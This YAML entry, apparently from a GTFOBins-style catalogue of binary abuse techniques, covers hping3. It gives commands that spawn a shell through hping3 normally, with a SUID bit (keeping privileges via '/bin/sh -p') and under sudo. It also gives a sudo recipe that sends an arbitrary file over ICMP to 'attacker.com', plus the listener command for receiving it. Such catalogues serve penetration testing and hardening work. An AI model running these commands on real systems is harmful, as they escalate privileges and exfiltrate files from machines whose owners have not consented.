---
functions:
  shell:
    - code: |
        hping3
        /bin/sh
  suid:
    - code: |
        ./hping3
        /bin/sh -p
  sudo:
    - code: |
        sudo hping3
        /bin/sh
    - description: |
        The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:

        ```
        sudo hping3 --icmp --listen xxx --dump
        ```
      code: |
        RHOST=attacker.com
        LFILE=file_to_read
        sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
---
